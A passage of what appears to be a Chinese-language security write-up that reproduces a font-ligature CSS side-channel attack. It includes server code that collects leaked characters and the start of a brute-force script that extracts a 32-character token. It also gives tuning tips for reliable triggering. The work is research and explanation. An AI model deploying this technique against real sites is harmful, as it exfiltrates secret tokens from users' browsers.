            'Access-Control-Allow-Origin': '*',
        });
        res.send(createFont(prefix, Array.from(charsToLigature)));
    });
    // Endpoint do przyjmowania znaków przez połączenie zwrotne
    app.get("/reverse/:chars", function(req, res) {
        res.cookie('chars', req.params.chars);
        res.set('Set-Cookie', `chars=${encodeURIComponent(req.params.chars)}; Path=/`);
        res.send();
    });
    app.get('/cookie.js', (req, res) => {
        res.sendFile('js.cookie.js', {
            root: './node_modules/js-cookie/src/'
        });
    });
    app.get('/index.html', (req, res) => {
        res.sendFile('index.html', {
            root: '.'
        });
    });
    app.listen(PORT, () => {
        console.log(`Listening on ${PORT}...`);
    })
这里我们先只用到`/font`的 api 用来直接生成我们需要的 woff 文件，然后我们构造两个页面，第一个 test.html ，包含我们需要获取的
token2 ，有以下代码：
        Document
我们这里用`display:table`将`script`标签内的内容输出出来，然后禁止换行，并使用我们构造的字体。那个 url 获取到的就是以下 svg
生成的 woff 文件：
                ' horiz-adv-x='0' d='M1 0z'/>
也就是说这里构造了一个除了`"7`连字有一定宽度之外，其他字符都是0宽度。
第二个页面就是 font.html ，内容比较简单，构造一个适当宽度的 iframe 将 test.html 引入即可。
        Document
至于 width 为 500 px，是`script`标签内内容长度，这个需要宽度也比较关键，因为 svg
中连字的构建也不是特比好构建，也就是如果无法构建好连字，也就无法弄出滚动条，也就无处触发我们构造的请求了。所以 iframe 的宽度并不是越宽越好...
svg horiz-adv-x 的参数也不是越大就能触发...
如果按照原作者设置的 iframe width 为 40px，svg 连字 horiz-adv-x 参数为 1000
的话，就会出现如上情况。如果各位小伙伴去自己尝试一下就会发现，有一个很明显的 lightblue 颜色的瞬间，也就是 script
标签的颜色，个人认为因为浏览器渲染的顺序问题，先把在这个场景中长度为 463px 的 script
标签首先因为`display:table`的原因，在网络请求字体之前首先被渲染了，所以会看到一条 lightblue 颜色带一闪而过，导致撑破了
iframe 设置的长度，也就产生了滚动条，随即触发了我们构造的请求，随后字体才会被浏览器进行渲染，然后将我们构造的其他字体设为 0 宽度。
而且还有一些问题就是缓存的问题，效果如下：
这也是原作者在原文提到的先发送一个请求让 chrome
缓存好字体的原因，但是这个方法及其不稳定...用原作者的代码直接跑跑的结果也是五花八门，每次跑都不一样。
然后比较稳定的办法是，预测 script 标签内的长度，比如这里的 463px
，我们设置一个比它大的值，这样一开始的渲染就不会影响到我们的结果了，对应的连字 horiz-adv-x 我们也将其扩大到 500000
，这样就能保证每次都可以以正确的结果造成宽度溢出然后触发我们的请求了。
But，这个办法需要知道大概 script 标签内大概的宽度，万一不知道呢？
我们可以参考 ROIS 的做法，使用 iframe 的 onload 事件，当 iframe 加载完成之后再将 iframe
宽度缩小，这样就能稳定触发了。也就是说 font.html 中 iframe 我们可以这么写：
一开始设置一个特别大的宽度，保证不会因为渲染顺序的原因触发我们构造的请求，待到 iframe 内字体加载完毕，再将其宽度缩小，触发我们构造的请求。
以下是原作者使用二分加快爆破、提前缓存避免缓存问题构造的 index.html 代码：
        (async function() {
            const EXPECTED_TOKEN_LENGTH = 32;
            const ALPHABET = '0123456789abcdef';
            // W poniższym elemencie będziemy wypisywać przeczytany token.
            const outputElement = document.getElementById('token');
            // W tej zmiennej przechowamy token, który udało się już
            // wydobyć
            let extractedToken = '';
            // W tej zmiennej przechowamy prefix do tworzenia ligatur
            let prefix = '"';
            // Wysokopoziomowo: po prostu wyciągamy kolejny znak tokena
            // dopóki nie wyciągnęliśmy wszystkich znaków :) 
            while (extractedToken.length < EXPECTED_TOKEN_LENGTH) {
                const nextTokenChar = await getNextTokenCharacter();
                extractedToken += nextTokenChar;
                // Znak, który wyciągnęliśmy musi być też dodany do przedrostka
                // dla następnych ligatur.
                prefix += nextTokenChar;